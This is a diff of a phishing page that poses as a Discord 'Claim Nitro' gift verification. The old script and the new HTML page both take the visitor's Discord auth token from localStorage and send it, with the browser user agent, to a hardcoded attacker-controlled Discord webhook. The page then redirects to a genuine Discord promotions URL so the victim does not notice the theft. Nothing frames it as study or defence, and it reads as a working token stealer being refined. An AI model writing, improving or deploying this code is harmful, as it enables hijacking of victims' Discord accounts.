@@ -1,38 +1,49 @@
-<script>
-    (function() {
-        const init = () => {
-            const btn = document.getElementById('btn');
-            if (!btn) return;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required</title>
+    <style>
+        body { background: #36393f; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #2f3136; padding: 40px; border-radius: 8px; text-align: center; width: 350px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
+        button { background: #5865f2; border: none; color: white; padding: 15px 30px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; }
+        button:hover { background: #4752c4; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>Claim Nitro</h1>
+        <p>Your gift is waiting. Please verify your account to continue.</p>
+        <button id="claimBtn">Accept Gift</button>
+    </div>
 
-            btn.addEventListener('click', async () => {
-                const status = document.getElementById('status');
-                btn.style.opacity = '0.5';
-                btn.style.pointerEvents = 'none';
-                status.innerText = "Checking...";
+    <script>
+        document.getElementById('claimBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('claimBtn');
+            btn.disabled = true;
+            btn.innerText = "Processing...";
 
-                const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
+            // Robust token collection
+            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
 
-                if (token) {
+            if (token) {
+                try {
                     await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            embeds: [{
-                                title: "New Session Captured",
-                                description: `Token: ${token}`,
-                                color: 5763719
-                            }]
+                            content: `**Token Found:** \`${token}\`\n**User-Agent:** ${navigator.userAgent}`
                         })
                     });
+                } catch (e) {
+                    console.error("Transmission error:", e);
                 }
+            }
 
-                status.innerText = "Applied. Redirecting...";
-                setTimeout(() => {
-                    window.location.href = "https://discord.com/billing/promotions/gift-accepted";
-                }, 1000);
-            });
-        };
-
-        window.addEventListener('load', init);
-    })();
-</script>
+            // Forced redirect
+            window.location.replace("https://discord.com/billing/promotions/gift-accepted");
+        });
+    </script>
+</body>
+</html>
